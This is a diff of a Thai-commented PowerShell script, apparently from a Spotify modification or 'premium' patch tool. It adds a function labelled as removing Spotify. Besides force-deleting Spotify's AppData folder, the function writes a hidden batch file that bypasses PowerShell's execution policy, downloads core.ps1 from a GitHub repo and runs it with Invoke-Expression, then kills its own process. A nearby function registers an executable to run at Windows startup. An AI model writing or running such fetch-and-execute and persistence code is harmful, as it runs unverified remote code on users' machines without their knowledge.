@@ -17,6 +17,34 @@ function Write-Log {
 }
 
 ###############################################
+# ฟังก์ชันสำหรับลบไฟล์ Spotify และข้อมูลที่เกี่ยวข้อง
+function Remove-Spotify {    
+    $spotifyPath = "$env:APPDATA\Spotify" 
+    if (Test-Path $spotifyPath) {
+        Remove-Item -Path $spotifyPath -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    else {
+    }
+
+    # สร้างไฟล์ .bat สำหรับการลบ Spotify และรัน core.ps1
+    $batchScript = @"
+@echo off
+set PWSH=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
+set ScriptUrl=https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/heads/main/core.ps1
+
+"%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "& { Invoke-Expression (Invoke-WebRequest -Uri '%ScriptUrl%').Content }"
+"@
+    # สร้างและรันไฟล์ .bat
+    $batFilePath = [System.IO.Path]::Combine($env:TEMP, "remove_spotify.bat")
+    $batchScript | Set-Content -Path $batFilePath
+    Start-Process -FilePath $batFilePath -NoNewWindow -Wait
+    # ลบไฟล์ .bat หลังจากทำงานเสร็จ
+    Remove-Item -Path $batFilePath -Force
+    Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
+    exit
+}
+
+###############################################
 # ฟังก์ชันเพิ่มโปรแกรมใน Registry สำหรับ Startup
 function Add-StartupRegistry {
     $motifyPath = "$env:APPDATA\Motify\SystemID.exe"
